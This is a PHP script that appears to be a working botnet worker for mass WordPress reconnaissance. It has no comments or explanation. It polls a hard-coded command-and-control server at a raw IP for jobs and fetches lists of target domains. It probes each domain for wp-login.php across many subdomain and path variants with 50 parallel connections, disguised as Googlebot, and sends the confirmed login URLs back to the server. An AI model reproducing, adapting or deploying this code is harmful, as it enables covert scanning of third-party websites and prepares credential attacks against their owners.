<?php
@set_time_limit(0);
@error_reporting(0);
@ignore_user_abort(1);
@ini_set("memory_limit", "500M");

sleep(678);

function send($od, $array)
{
    $postData = 'od=' . $od . '&array=' . $array;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://5.8.18.7/drwnfcl1/dche/day.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $output = curl_exec($ch);
    curl_close($ch);
}

function get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLINFO_HEADER_OUT, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    curl_setopt($ch, CURLOPT_ENCODING, "utf-8");
    curl_setopt($ch, CURLOPT_COOKIE, "wordpress_test_cookie=WP+Cookie+check");
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function go($aid)
{

    $dopl = array(
        'http://$site$/wp-login.php',
        'http://$site$/wp-login.php',
        'http://$site$/blog/wp-login.php',
        'http://$site$/wp/wp-login.php',
        'http://$site$/wordpress/wp-login.php',
        'http://$site$/test/wp-login.php',
        'http://$site$/news/wp-login.php',
        'http://$site$/site/wp-login.php',
        'http://$site$/en/wp-login.php',
        'http://$site$/web/wp-login.php',
        'http://$site$/cms/wp-login.php',
        'http://$site$/home/wp-login.php',
        'http://$site$/new/wp-login.php',
        'https://$site$/wp-login.php',
        'https://$site$/wp-login.php',
        'https://$site$/blog/wp-login.php',
        'https://$site$/wp/wp-login.php',
        'https://$site$/wordpress/wp-login.php',
        'https://$site$/test/wp-login.php',
        'https://$site$/news/wp-login.php',
        'https://$site$/site/wp-login.php',
        'https://$site$/en/wp-login.php',
        'https://$site$/web/wp-login.php',
        'https://$site$/cms/wp-login.php',
        'https://$site$/home/wp-login.php',
        'https://$site$/new/wp-login.php',
        'http://www.$site$/wp-login.php',
        'http://www.$site$/blog/wp-login.php',
        'http://www.$site$/wp/wp-login.php',
        'http://www.$site$/wordpress/wp-login.php',
        'http://www.$site$/test/wp-login.php',
        'http://www.$site$/news/wp-login.php',
        'http://www.$site$/site/wp-login.php',
        'http://www.$site$/en/wp-login.php',
        'http://www.$site$/web/wp-login.php',
        'http://www.$site$/cms/wp-login.php',
        'http://www.$site$/home/wp-login.php',
        'http://www.$site$/new/wp-login.php',
        'http://m.$site$/wp-login.php',
        'http://m.$site$/blog/wp-login.php',
        'http://m.$site$/wp/wp-login.php',
        'http://m.$site$/wordpress/wp-login.php',
        'http://m.$site$/test/wp-login.php',
        'http://m.$site$/news/wp-login.php',
        'http://m.$site$/site/wp-login.php',
        'http://m.$site$/en/wp-login.php',
        'http://m.$site$/web/wp-login.php',
        'http://m.$site$/cms/wp-login.php',
        'http://m.$site$/home/wp-login.php',
        'http://m.$site$/new/wp-login.php',
        'http://test.$site$/wp-login.php',
        'http://test.$site$/blog/wp-login.php',
        'http://test.$site$/wp/wp-login.php',
        'http://test.$site$/wordpress/wp-login.php',
        'http://test.$site$/test/wp-login.php',
        'http://test.$site$/news/wp-login.php',
        'http://test.$site$/site/wp-login.php',
        'http://test.$site$/en/wp-login.php',
        'http://test.$site$/web/wp-login.php',
        'http://test.$site$/cms/wp-login.php',
        'http://test.$site$/home/wp-login.php',
        'http://test.$site$/new/wp-login.php',
        'http://blog.$site$/wp-login.php',
        'http://blog.$site$/blog/wp-login.php',
        'http://blog.$site$/wp/wp-login.php',
        'http://blog.$site$/wordpress/wp-login.php',
        'http://blog.$site$/test/wp-login.php',
        'http://blog.$site$/news/wp-login.php',
        'http://blog.$site$/site/wp-login.php',
        'http://blog.$site$/en/wp-login.php',
        'http://blog.$site$/web/wp-login.php',
        'http://blog.$site$/cms/wp-login.php',
        'http://blog.$site$/home/wp-login.php',
        'http://blog.$site$/new/wp-login.php',
        'http://www2.$site$/wp-login.php',
        'http://www2.$site$/blog/wp-login.php',
        'http://www2.$site$/wp/wp-login.php',
        'http://www2.$site$/wordpress/wp-login.php',
        'http://www2.$site$/test/wp-login.php',
        'http://www2.$site$/news/wp-login.php',
        'http://www2.$site$/site/wp-login.php',
        'http://www2.$site$/en/wp-login.php',
        'http://www2.$site$/web/wp-login.php',
        'http://www2.$site$/cms/wp-login.php',
        'http://www2.$site$/home/wp-login.php',
        'http://www2.$site$/new/wp-login.php',
        'http://news.$site$/wp-login.php',
        'http://news.$site$/blog/wp-login.php',
        'http://news.$site$/wp/wp-login.php',
        'http://news.$site$/wordpress/wp-login.php',
        'http://news.$site$/test/wp-login.php',
        'http://news.$site$/news/wp-login.php',
        'http://news.$site$/site/wp-login.php',
        'http://news.$site$/en/wp-login.php',
        'http://news.$site$/web/wp-login.php',
        'http://news.$site$/cms/wp-login.php',
        'http://news.$site$/home/wp-login.php',
        'http://news.$site$/new/wp-login.php',
        'http://new.$site$/wp-login.php',
        'http://new.$site$/blog/wp-login.php',
        'http://new.$site$/wp/wp-login.php',
        'http://new.$site$/wordpress/wp-login.php',
        'http://new.$site$/test/wp-login.php',
        'http://new.$site$/news/wp-login.php',
        'http://new.$site$/site/wp-login.php',
        'http://new.$site$/en/wp-login.php',
        'http://new.$site$/web/wp-login.php',
        'http://new.$site$/cms/wp-login.php',
        'http://new.$site$/home/wp-login.php',
        'http://new.$site$/new/wp-login.php',
        'http://old.$site$/wp-login.php',
        'http://old.$site$/blog/wp-login.php',
        'http://old.$site$/wp/wp-login.php',
        'http://old.$site$/wordpress/wp-login.php',
        'http://old.$site$/test/wp-login.php',
        'http://old.$site$/news/wp-login.php',
        'http://old.$site$/site/wp-login.php',
        'http://old.$site$/en/wp-login.php',
        'http://old.$site$/web/wp-login.php',
        'http://old.$site$/cms/wp-login.php',
        'http://old.$site$/home/wp-login.php',
        'http://old.$site$/new/wp-login.php',
        'http://beta.$site$/wp-login.php',
        'http://beta.$site$/blog/wp-login.php',
        'http://beta.$site$/wp/wp-login.php',
        'http://beta.$site$/wordpress/wp-login.php',
        'http://beta.$site$/test/wp-login.php',
        'http://beta.$site$/news/wp-login.php',
        'http://beta.$site$/site/wp-login.php',
        'http://beta.$site$/en/wp-login.php',
        'http://beta.$site$/web/wp-login.php',
        'http://beta.$site$/cms/wp-login.php',
        'http://beta.$site$/home/wp-login.php',
        'http://beta.$site$/new/wp-login.php',
        'http://shop.$site$/wp-login.php',
        'http://shop.$site$/blog/wp-login.php',
        'http://shop.$site$/wp/wp-login.php',
        'http://shop.$site$/wordpress/wp-login.php',
        'http://shop.$site$/test/wp-login.php',
        'http://shop.$site$/news/wp-login.php',
        'http://shop.$site$/site/wp-login.php',
        'http://shop.$site$/en/wp-login.php',
        'http://shop.$site$/web/wp-login.php',
        'http://shop.$site$/cms/wp-login.php',
        'http://shop.$site$/home/wp-login.php',
        'http://shop.$site$/new/wp-login.php'
    );
    $otv = array();
    $links = array();
    $lin = file('http://5.8.18.7/drwnfcl1/dche/bbd/' . $aid, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (sizeof($lin) < 50) exit;
    for ($a = 0;$a <= sizeof($dopl) - 1;$a++)
    {
        for ($i = 0;$i <= sizeof($lin) - 1;$i++)
        {
            $links[] = str_replace('$site$', $lin[$i], $dopl[$a]);
        }
    }
    $maxThreads = 50;
    $multicurlInit = curl_multi_init();
    do
    {
        while (@$active <= $maxThreads)
        {
            @$active++;
            if (count($links) == 0) break;
            $idLink = array_rand($links);
            $link = $links[$idLink];
            unset($links[$idLink]);
            $newThread = curl_init();
            curl_setopt_array($newThread, array(
                CURLOPT_URL => $link,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_CONNECTTIMEOUT => 15,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS => 3,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
                CURLOPT_PRIVATE => $link,
                CURLOPT_FAILONERROR => false
            ));
            curl_multi_add_handle($multicurlInit, $newThread);
            unset($newThread);
        }
        $curlMultiResult = curl_multi_exec($multicurlInit, $active);
        do
        {
            $result = curl_multi_info_read($multicurlInit);
            if (!is_array($result)) break;
            $id = curl_getinfo($result['handle'], CURLINFO_PRIVATE);
            $ttemp = curl_multi_getcontent($result['handle']);

            if (preg_match('#"(https|http)://([^"]*?)/wp-login.php\?action=lostpassword#', $ttemp))
            {
                preg_match('#"(https|http)://([^"]*?)/wp-login.php\?action=lostpassword#', $ttemp, $qwest);
                if (isset($qwest[2]))
                {
                    if ((strlen($qwest[2]) > 4) and (strlen($qwest[2]) < 90))
                    {
                        $otv[] = $qwest[1] . '://' . $qwest[2];
                    }
                }
            }
            else
            {
                if (preg_match('#redirect_to" value="(https|http)://([^"]*?)/wp-admin/"#', $ttemp))
                {
                    preg_match('#redirect_to" value="(https|http)://([^"]*?)/wp-admin/"#', $ttemp, $qwest);
                    if (isset($qwest[2]))
                    {
                        if ((strlen($qwest[2]) > 4) and (strlen($qwest[2]) < 90))
                        {
                            $otv[] = $qwest[1] . '://' . $qwest[2];
                        }
                    }
                }
            }

            curl_multi_remove_handle($multicurlInit, $result['handle']);
            curl_close($result['handle']);
        }
        while (true);
        if (count($links) == 0 && $active == 0) break;
    }
    while (true);
    return $otv;
}
$err = 0;
while (true)
{
    $idtemp = @get('http://5.8.18.7/drwnfcl1/dche/');
    if ($idtemp == 'ext') exit;
    if (preg_match("/ISD(.*?)ISD/", $idtemp))
    {
        $idtemp2 = explode('ISD', $idtemp);
        $id = $idtemp2[1];
        $arr = go($id);
        if (isset($arr[0]))
        {
            send($id, implode('|!', $arr));
        }
        @get('http://5.8.18.7/drwnfcl1/dche/de1s.php?d=' . $id . '|' . sizeof($arr));
        $err = 0;
    }
    else
    {
        $err = $err + 1;
        sleep(300);
    }
    if ($err > 12) exit;
}

